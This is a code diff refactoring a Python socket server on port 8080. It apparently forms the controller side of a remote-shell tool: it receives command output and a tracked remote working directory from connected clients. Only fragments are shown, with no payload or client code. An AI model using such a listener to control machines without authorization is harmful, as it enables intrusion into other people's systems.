@@ -1,10 +1,6 @@
 import socket
 
-def start_server():
-    s = socket.socket()
-    s.settimeout(1)
-    print("")
-    print("Socket created.")
+def start_server(s: socket.socket):
     
     s.bind(('0.0.0.0', 8080))
     print("Socket binded to 8080")
@@ -36,11 +32,25 @@ def start_server():
                     cwd = response.split("cURR_dIR")[1]
                     print(output)
                     print("")
-                except:
-                    print("Client must have disconnected.")
+                except Exception as e:
+                    print("Connection has been cut.", e)
                     break
+            break
         except socket.timeout:
-            continue
+            continue 
 
 if __name__ == "__main__":
-    start_server()
+    try:
+        s = socket.socket()
+        s.settimeout(1)
+        print("")
+        print("Socket created.")
+        start_server(s)
+    except KeyboardInterrupt:
+        # clean everything up once the user presses ctrl+c
+        print("")
+        print("Closing socket...")
+        s.close()
+        print("Closing server...")
+        print("")
+        exit()       
